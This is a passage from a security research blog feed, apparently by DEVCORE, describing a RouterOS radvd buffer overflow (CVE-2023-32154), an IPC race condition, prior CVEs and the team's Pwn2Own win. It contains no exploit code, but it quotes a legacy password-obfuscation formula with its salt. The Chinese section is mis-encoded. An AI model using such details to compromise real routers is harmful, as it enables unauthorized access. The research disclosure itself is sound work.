&lt;p&gt;‰ΩÜÂ¶ÇÊûúÁ¨¨‰∫åÂÄã RA Â∞ÅÂåÖÂ§™Âø´Ë¢´ÈÄÅÂà∞Ôºå‰ª•Ëá≥Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÈÉΩÈÇÑÊ≤íÊúâÊää id ÈÄèÈÅé response ÈÄÅÂõû‰æÜÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Âè™ËÉΩÂÖàÊääËàäÁöÑ DNS remote object Ê®ôË®òÊàê destroyed ÈÄ≤Ë°åËªüÂà™Èô§„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•Ëëó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÁπºÁ∫åÁÇ∫Êî∂Âà∞ÁöÑÁ¨¨‰∫åÂÄã RA Â∞ÅÂåÖ‰∏≠ÁöÑ RDNSS Ê¨Ñ‰ΩçÂª∫Á´ãÊñ∞ÁöÑ DNS remote objectÔºå‰ΩÜÁî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÈÇÑÊ≤íÊúâÁµêÊùüÁ¨¨‰∏ÄÂÄãËø≠‰ª£ÔºåÊâÄ‰ª•ÈÄôÂÄãÊñ∞ÁöÑË´ãÊ±ÇÊúÉÂÅúÁïôÂú® socket Ë£°Èù¢Á≠âÂæÖ‰∏ã‰∏ÄÂÄãËø≠‰ª£ÊâçËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÂõûÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;ÔºåÁ¨¨‰∏ÄÂÄãËø≠‰ª£‰ª•ÂõûÂÇ≥ id Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÂÅöÊî∂Â∞æÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ÁöÑ ResponseHandler ÊúÉÊ†πÊìöÊãøÂà∞ÁöÑ id ÂéªÊõ¥Êñ∞ remote objectÔºå‰ΩÜÁî±ÊñºÂ∞çÊáâÁöÑ remote object Â∑≤Á∂ìË¢´Ê®ôË®òÊàêÂà™Èô§ÔºåÊâÄ‰ª• ResponseHandler ‰∏çÊúÉÂéªÊõ¥Êñ∞ object idÔºåËÄåÊòØÁõ¥Êé•Âà™Èô§Ë©≤ object„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ResponseHandler Âú®Âà™Èô§ÂÆå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; ‰∏≠‰øùÂ≠òÁöÑ remote object ‰πãÂæåÔºåÊúÉÁôºÈÄÅ‰∏ÄÂÄã delete object ÁöÑ message Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt;ÔºåÂëäÁü•ÂÆÉÂ∞çÊáâÁöÑ remote object Â∑≤Á∂ì‰∏çÂÜç‰ΩøÁî®ÊâÄ‰ª•Ë¶ÅÈÄ≤Ë°åÂà™Èô§Ôºå‰ΩÜ‰∏ÄÊ®£ÊúÉÂÖàÂç°Âú® socket Ë£°Èù¢Á≠âÂæÖËôïÁêÜ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•Ëëó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÈÄ≤ÂÖ•‰∫ÜÁ¨¨‰∫åÊ¨°Ëø≠‰ª£ÔºåÂÆÉÊúÉÂÖàÊãøÂà∞ socket ‰∏≠ÁÇ∫‰∫ÜÁ¨¨‰∫åÂÄã RA ÂâµÂª∫ remote object ÁöÑË´ãÊ±ÇÔºåÁÇ∫Á¨¨‰∫åÂÄã RA ÁöÑ DNS ÂâµÂª∫Â∞çÊáâÁöÑ remote objectÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂú®Êé•ËëóËôïÁêÜ delete Ë´ãÊ±Ç‰πãÂâçÔºåÂÖàÂâçË®≠ÂÆöÁöÑ timer ÊôÇÈñìÂà∞‰∫ÜÔºåÊâÄ‰ª•&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolver&lt;/code&gt; ÊúÉÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::sendChanges&lt;/code&gt; ‰æÜÈÄöÁü•ÊâÄÊúâÁöÑË®ÇÈñ±ËÄÖÁèæÂú® resolver Áü•ÈÅìÁöÑ DNS ÊúâÂì™‰∫õÔºåÂõ†ÁÇ∫ object 1 ÈÇÑÊ≤íÊúâË¢´Âà™Èô§ÔºåÂõ†Ê≠§ resolver ÊúÉÊääÂÖ©Ê¨°ÁöÑË´ãÊ±ÇÂâµÂª∫ÁöÑ DNS ÈÄöÈÄöÈÉΩÊé®Êí≠Âá∫Âéª„ÄÇ&lt;/p&gt;

&lt;p&gt;radvd Âú®Êî∂Âà∞ÈÄôÊ®£ÁöÑË≥áË®ä‰πãÂæåÂ∞±ÊúÉÈ¶¨‰∏äÊßãÈÄ†Áî®‰æÜÂú® LAN Âª£Êí≠ÁöÑ RA Â∞ÅÂåÖÔºåÊ≠§ÊôÇÂÖ©Ê¨°ÁöÑË´ãÊ±ÇÁµêÊûúË¢´Ê∑∑Âú®‰∏ÄËµ∑‰∫ÜÔºåÈÄô‰πüÂ∞±ÊòØÁÇ∫‰ªÄÈ∫º‰∏ÄÈñãÂßãÊàëÂÄëÁöÑÊîªÊìäÂè™ÊúÉÂú® MacOS ‰∏äÊàêÂäüÁöÑÂéüÂõ†„ÄÇÈõñÁÑ∂ÈÄôÂÄã race condition ËÅΩËµ∑‰æÜÂæàÈõ£Ëß∏ÁôºÔºàÂà™Èô§Ë´ãÊ±ÇÊØî timer ÂÖàÈÄ≤Ë°åËôïÁêÜÁöÑË©±Â∞±‰∏çÊúÉËß∏ÁôºÔºâÔºå‰ΩÜÈÄôÊòØÂõ†ÁÇ∫Êñπ‰æøËß£ÈáãÔºåÊâÄ‰ª•Êï¥ÂÄãÊµÅÁ®ãË¢´ÊàëÂÄëÂ§ßÂπÖÁ∞°Âåñ‰∫ÜÔºåÂØ¶Èöõ‰∏äÂè™Ë¶ÅÂÖ©ÂÄãÂ∞ÅÂåÖÂà∞ÈÅîÁöÑÊôÇÈñìÈñìÈöîÂ§†Áü≠ÈÄôÂÄã race Â∞±‰∏ÄÂÆöÊúÉÊàêÂäü„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/77.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;Â∞èÁµê-1&quot;&gt;Â∞èÁµê&lt;/h3&gt;

&lt;p&gt;ÈÄèÈÅé‰∏äÈù¢ÁöÑÂàÜÊûêÔºåÊàëÂÄëÂú® RouterOS ÁöÑ remote object Ê©üÂà∂‰∏≠ÊâæÂà∞‰∫Ü‰∏ÄÂÄã race condition ÁöÑ patternÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Âú®Êñ∞Â¢û/Âà™Èô§ remote object ÊôÇÔºå‰ΩøÁî®‰∫Ü non-blocking ÁöÑÊñπÊ≥ï&lt;/li&gt;
  &lt;li&gt;ÊúâË®ÇÈñ± remote object&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄèÈÅéÈÄôÈ°ûÂûãÁöÑÊºèÊ¥ûÔºåÊîªÊìäËÄÖÂèØ‰ª•Â∞áÂÖ©Ê¨°Ë´ãÊ±ÇÁöÑÁµêÊûúÊ∑∑ÂêàÊàê‰∏ÄÂÄãÂõûÂÇ≥ÔºåÊàñË®±ÂèØ‰ª•‰ΩúÁÇ∫‰∏ÄÂÄãÁî®‰æÜÁπûÈÅéÊüê‰∫õÂÆâÂÖ®ÊÄßÊ™¢Êü•ÁöÑÊâãÊ≥ï„ÄÇÂ¶ÇÊûúÈ†ÜÂà©ÊâæÂà∞ÂèØÂà©Áî®ÁöÑÊºèÊ¥ûÔºåÊàëÂÄëÈÇÑÂèØ‰ª•Áî®‰æÜÂèÉÂä† Pwn2Own Áï∂‰∏≠ÁöÑ router  È°ûÂà•‰∏≠ÁöÑ LAN È†ÖÁõÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÊúÄÂæåÊôÇÈñìÁ∑äËø´ÔºåÊàëÂÄë‰∏¶Ê≤íÊúâÈÄèÈÅé race condition ÊâæÂà∞ÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥û„ÄÇËÄå‰∏îÁ¶ç‰∏çÂñÆË°åÔºåÂú®Â†±ÂêçÊ∫ñÂÇôÊà™Ê≠¢ÊôÇÔºåÊàëÂÄëÊâçÁôºÁèæÈÄôÂπæÂÄãÊúà‰æÜË¢´ÊàëÂÄëÊ∏¨Ë©¶‰∫Ü‰∏äÁôæÊ¨°ÁöÑ exploit Â≠òÂú®‰∏Ä‰∫õÂïèÈ°åÔºåÂ∞±Âú®Â†±ÂêçÊà™Ê≠¢ÁöÑ‰∏âÂÄãÂ∞èÊôÇÂâçÂÉèÈ¨ºÊâìÁâÜ‰∏ÄÊ®£ÔºåÊÄéÈ∫ºÊâìÊÄéÈ∫ºÂ§±ÊïóÔºåÁ∞°Áõ¥Â∞±ÊòØÊï∏‰Ωç‰∏ñ‰ª£ÁöÑÈÄ¢È≠îÊôÇÂàªÔºåÊàëÂÄë‰∏ÄÁõ¥Êõ¥Êñ∞ exploit ‰∏¶‰∏î‰∏çÊñ∑Êõ¥Êñ∞Ê∫ñÂÇô‰∏ä‰∫§ÁöÑÊºèÊ¥ûÁôΩÁöÆÊõ∏Ôºå‰∏ÄÁõ¥Âà∞Â†±ÂêçÂâçÊ≠¢ÁöÑÂçäÂ∞èÊôÇÂâçÔºàÂáåÊô®ÂõõÈªûÊà™Ê≠¢ÔºâÊâçÈ†ÜÂà©ÂÆåÊàê„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÊòØÈùûÂ∏∏Âπ∏ÈÅãÁöÑÔºåÊàëÂÄëÂú®Ë≥Ω‰∏≠ÂÉÖÂòóË©¶‰∏ÄÊ¨°Â∞±È†ÜÂà©ÁöÑÂÆåÊàê‰∫ÜÊîªÊìäÔºåÊàêÁÇ∫ Pwn2Own Ê≠∑Âè≤‰∏äÁ¨¨‰∏ÄÁµÑÂÆåÊàê SOHO SMASHUP ÈÄôÂÄãÊñ∞È°ûÂà•ÁöÑÈöä‰ºçÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂú®ÈÄôÂÄãÈ†ÖÁõÆ‰∏≠Áç≤Âæó‰∫Ü 10 Èªû Master of Pwn ÈªûÊï∏ÈÇÑÊúâ $100,000 ÁæéÈáëÁöÑÁçéÈáëÔºåÊúÄÁµÇÂú®ÊØîË≥ΩÁµêÁÆóÊôÇÔºåDEVCORE ‰ª• 18.5 ÂÄã Master of Pwn ÈªûÊï∏Â•™‰∏ãÂÜ†Ëªç„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂÜ†ËªçÈô§‰∫ÜÁç≤Âæó Master of Pwn ÁöÑÈ†≠Èäú„ÄÅÁçéÊùØ„ÄÅÂ§ñÂ•ó‰πãÂ§ñÔºåÁÖßÊÖ£‰æãÔºå‰∏ªËæ¶ÊñπÈÇÑÊúÉÂêÑÂØÑ‰∏ÄÂè∞ÊàëÂÄëÊâì‰∏ãÁöÑË®≠ÂÇôÈÅé‰æÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÔºàÊàëÂÄëÊ≤íËæ¶Ê≥ïÊääÊâÄÊúâÊù±Ë•øÈÉΩÂ°ûÈÄ≤Áõ∏Ê°ÜË£°Ôºâ
&lt;img src=&quot;/assets/img/blog/20240524/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h2&gt;

&lt;p&gt;Âú®Êú¨Ê¨°Á†îÁ©∂‰∏≠ÔºåÊàëÂÄëÂ∞ç RouterOS ÈÄ≤Ë°å‰∫ÜÊ∑±ÂÖ•Êé¢Ë®éÔºåÈÄ≤ËÄåÊè≠Èú≤‰∫Ü‰∏ÄÂÄãÊΩõËóèÂú® RouterOS ÂÖßÈï∑ÈÅî‰πùÂπ¥ÁöÑÂÆâÂÖ®ÊºèÊ¥ûÔºå‰∏¶ÊàêÂäüÂà©Áî®Ë©≤ÊºèÊ¥ûÂú® Pwn2Own Toronto 2022 ÁöÑË≥Ω‰∫ã‰∏≠Â•™‰∏ã SOHO SMASHUP ÁöÑÈ†ÖÁõÆ„ÄÇÊ≠§Â§ñÔºåÊàëÂÄëÈÇÑÂú® IPC ‰∏≠ÁôºÁèæ‰∫Ü‰∏ÄÁ®ÆÂ∞éËá¥ race condition ÁöÑË°åÁÇ∫Ê®°Âºè„ÄÇÊúÄÂæåÔºåÊàëÂÄë‰πüÂ∞áË≥Ω‰∫ã‰∏≠‰ΩøÁî®ÁöÑÂ∑•ÂÖ∑ÈñãÊ∫êÊñº https://github.com/terrynini/routeros-tools Ôºå‰æõÂ§ßÂÆ∂ÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄöÈÅéÊú¨Ê¨°Á†îÁ©∂ÂèäÂàÜ‰∫´ÔºåDEVCORE Â∏åÊúõÂàÜ‰∫´ÊàëÂÄëÁöÑÁôºÁèæÂíåÁ∂ìÈ©óÔºåÂæûËÄåÂçîÂä©ÁôΩÂ∏ΩÈß≠ÂÆ¢Ê∑±ÂÖ•‰∫ÜËß£ RouterOSÔºå‰Ωø‰πãËÆäÂæóÊõ¥Âä†ÈÄèÊòéÊòìÊáÇ„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/</link>
                <guid>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros</guid>
                <pubDate>Fri, 24 May 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pwn2Own Toronto 2022 : A 9-year-old bug in MikroTik RouterOS</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;DEVCORE research team found a 9-year-old WAN bug on RouterOS, the product of MikroTik. Combined with another bug of the Canon printer, DEVCORE becomes the first team ever to successfully complete an attack chain in the brand new SOHO Smashup category of Pwn2Own. And DEVCORE also won the title of Master of Pwn in Pwn2Own Toronto 2022.&lt;/p&gt;

&lt;p&gt;The vulnerability occurs in the radvd of RouterOS, which does not check the length of the RDNSS field when processing ICMPv6 packets for IPv6 SLAAC. As a result, an attacker can trigger the buffer overflow by sending two crafted Router Advertisement packets, that allows an attacker to gain full control over the underlying Linux system of the router without logging in and without user interaction. This vulnerability was assigned as CVE-2023-32154 with a CVSS score of 7.5.&lt;/p&gt;

&lt;p&gt;The vulnerability was reported to MikroTik by &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-710/&quot;&gt;ZDI&lt;/a&gt; on 2022/12/29 and patched on 2023/05/19. It has been patched in the following RouterOS releases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8&lt;/li&gt;
  &lt;li&gt;Stable Release 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pwn2own-soho-smashup&quot;&gt;Pwn2Own SOHO Smashup&lt;/h2&gt;

&lt;p&gt;Pwn2Own is a series of contests organized by The Trend Micro Zero Day Initiative (ZDI). They pick popular products as targets for different categories, such as: operating systems, browsers, electric cars, industrial control systems, routers, printers, smart speakers, smartphones, NAS, webcams, etc.&lt;/p&gt;

&lt;p&gt;As long as the participants can exploit a target without user interaction while the device is in its default state and the software is updated to the latest version, the team will receive the corresponding Master of Pwn points and bounty. And the team which has the highest Master of Pwn points will be the winner, who is also known as the ‚ÄúMaster of Pwn.‚Äù&lt;/p&gt;

&lt;p&gt;Due to the epidemic, Work From Home or SOHO (Small Office/Home Office) has become very common. Consider that, the Pwn2Own Toronto 2022 has  a special category called SOHO Smashup, in which participants need to hack routers from the WAN side, and then use the router as a trampoline to attack common household devices in LAN, such as smart speakers, printers, etc.&lt;/p&gt;

&lt;p&gt;In addition to the second highest prize of $100,000 (USD), the SOHO Smashup also has the highest score of 10, so if you‚Äôre aiming to win, you‚Äôll want to complete this category! We‚Äôve also chosen the lesser-explored MikroTik‚Äôs RouterBoard as the target to avoid bug collisions with others (both the bounty and score are halved when you have a collision with someone else).&lt;/p&gt;

&lt;h2 id=&quot;routeros&quot;&gt;RouterOS&lt;/h2&gt;

&lt;p&gt;The RouterOS is based on the Linux kernel and it‚Äôs also the default operating system of MikroTik‚Äôs RouterBoard. It can also be installed on a PC to turn it into a router.&lt;/p&gt;

&lt;p&gt;Though the RouterOS do use some GPL-License software, according to the &lt;a href=&quot;https://web.archive.org/web/20220603140018/https://mikrotik.com/downloadterms.html&quot;&gt;downloadterms&lt;/a&gt; page from MikroTik‚Äôs website, you have to pay $45 to MikroTik for sending a CD with GPL source, very interesting.&lt;/p&gt;

&lt;p&gt;Glad that there is already a nice guy who uploaded the &lt;a href=&quot;https://github.com/robimarko/routeros-GPL&quot;&gt;GPL source on the Github&lt;/a&gt;, though they didn‚Äôt help much on reversing the RouterOS.&lt;/p&gt;

&lt;h3 id=&quot;routeros-v7-and-routeros-v6&quot;&gt;RouterOS v7 and RouterOS v6&lt;/h3&gt;

&lt;p&gt;There are two versions of RouterOS on the download page of MikroTik‚Äôs website: RouterOS v7 and RouterOS v6. They are more like two branches of the RouterOS and share a similar design pattern. Because the default installed version of our target, RB2011UiAS-IN, is RouterOS v6, we focus on that version.
&lt;img src=&quot;/assets/img/blog/20240524/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS does not provide a formal way for users to manipulate the underlying Linux system, and users are trapped in a restricted console with a limited number of commands to manage the router, so there has been a lot of research on how to jailbreak RouterOS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The binary on the RouterOS uses a customized IPC to communicate with each other, and the IPC uses the ‚Äúnova message‚Äù format to pack messages. So we call such kinds of binary ‚Äúnova binary‚Äù afterward.&lt;/p&gt;

&lt;p&gt;Besides, the RouterOS has a special attack surface. The user can manage a RouterOS device remotely from a Windows computer with a GUI tool, WinBox, by sending a nova message through the TCP. So, if the RouterOS fails to validate the privilege of a nova message, the attacker can possibly invade the router by sending a crafted nova message from remote, but it‚Äôs not a top priority  because the WinBox is unavailable from WAN by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-of-related-cves&quot;&gt;Review of Related CVEs&lt;/h2&gt;

&lt;p&gt;We started by reviewing the CVEs in the past few years. There were 80 CVEs related to RouterOS at that time, of which 28 targeted the router itself in pre-auth scenarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4 out of the 28 CVEs are in scenarios that are more in line with the Pwn2Own rules, which means these vulnerabilities could allow an attacker to spawn a shell on the router or log in as admin without user interaction. Three of the vulnerabilities were discovered between 2017 and 2019, and three of these were discovered ‚Äúin the wild.‚Äù These four vulnerabilities are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-20149: Also known as Chimay-Red, this is one of the leaked vulnerabilities from the CIA‚Äôs ‚ÄúVault 7‚Äù in 2017. The vulnerability occurs when RouterOS parses HTTP requests, and if the Content-Length in the HTTP headers is negative, it will cause Integer Underflow, which together with the Stack Clash attack technique can control the program flow to achieve RCE.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;CVE-2018-7445&lt;/a&gt;: A buffer overflow in the SMB service of RouterOS, which found by black-box fuzzing and is the only one of the four vulnerabilities that was reported by the discoverer. Though the SMB is not  enabled defaultly.&lt;/li&gt;
  &lt;li&gt;CVE-2018-14847: Also the one of the leaked vulnerabilities from the ‚ÄúVault 7‚Äù, which could allow an attacker to achieve arbitrary file read. Which doesn‚Äôt sound like a big problem, but because in the earlier version of RouterOS, the user‚Äôs password was stored in a file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password xor md5(username + &quot;283i4jfkai3389&quot;)&lt;/code&gt;, the attacker can calculate the password of admin as long as the attacker can read the file.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;CVE-2021-41987&lt;/a&gt;ÔºöA heap buffer overflow vulnerability in the base64 decoding process of the SCEP service due to a length miscalculation. The vulnerability was discovered after security researchers analyzed an APT‚Äôs exploit on its C2 server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As we can see, most of these vulnerabilities are ‚Äúin the wild.‚Äù We can only learn limited knowledge about analyzing and reversing the RouterOS.&lt;/p&gt;

&lt;h2 id=&quot;review-of-related-research&quot;&gt;Review of Related Research&lt;/h2&gt;

&lt;p&gt;We continue to seek out publicly available research materials, and we have these articles and presentations available at the time of the competition:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-08-06_prez_SHA_MT_pub.pdf&quot;&gt;Kirils. Rooting the MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf&quot;&gt;Kirils. A deeper journey into MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-10-21_MT_Hacktivity_pub.pdf&quot;&gt;Kirils. Tools for effortless reverse engineering of MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2018
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/tenable/routeros&quot;&gt;Jacob Baines. Bug Hunting in RouterOS&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Explaining how nova message works in IPC&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2019
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6&quot;&gt;Jacob Baines. Make It Rain with MikroTik&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Identical to the talk in 2018&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24&quot;&gt;Jacob Baines. MikroTik Firewall &amp;amp; NAT Bypass&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;A vulnerability in WinBox: it can be used to scan the intranet once it‚Äôs exposed to the WAN&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;Maximiliano Vidal, Juan Caillava. Finding and exploiting CVE-2018‚Äì7445&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found buffer overflow in SMB by black-box fuzzing and how to exploit the vulnerability to get shell&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://mum.mikrotik.com/presentations/ID18/presentation_6149_1540240927.pdf&quot;&gt;Tomas Kirnak. Deep-dive: MikroTik exploits - a security analysis&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Discussing the mass exploit event after the leakage of CIA‚Äôs ‚ÄúVault7‚Äù arsenal&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Jacob-Baines-Help-Me-Vulnerabilities.-Youre-My-Only-Hope.pdf&quot;&gt;Jacob Baines. Help Me Vulnerabilities You‚Äôre My Only Hope&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Release a tool for jailbreaking RouterOS to help user to check if their router has been compromised in the mass exploit event&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21&quot;&gt;Jacob Baines. RouterOS: Chain to Root&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Get shell by chaining DNS poisoning and downgrade vulnerabilities&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2022
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;D39. Vulnerability Exposure &amp;amp; Notification on Mikrotik (CVE-2021-41987)&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found an exploit contains 0-day that targets RouterOS on an APT‚Äôs C2 server&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Detail the IPC mechanism of the RouterOS and release a jailbreak tool ‚ÄúFOISted‚Äù to help researchers do further research on the amd64 version of RouterOS.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://powerofcommunity.net/poc2022/QianChen.pdf&quot;&gt;Qian Chen. MikroTik RouterOS Security: The Forgotten IPC Message&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found several vulnerabilities in IPC by fuzzing&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;review-of-the-ipc-and-the-nova-message&quot;&gt;Review of the IPC and the Nova Message&lt;/h2&gt;

&lt;p&gt;Most of the research centers around RouterOS‚Äôs homebrew IPC, so we also took some time to review it. Here is a simple example to explain the main idea of the IPC.&lt;/p&gt;

&lt;p&gt;Normally, a user can log in to the RouterOS through telnet, and manage the router by console.
&lt;img src=&quot;/assets/img/blog/20240524/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs follow the procedure step by step:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;When the user tries to access the console of RouterOS through the telnet. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; process will spawn the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execl&lt;/code&gt;, which asks the user for account and password.
&lt;img src=&quot;/assets/img/blog/20240524/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;After getting the account and password, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; would pack that info into a nova message, and send it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process for authentication.
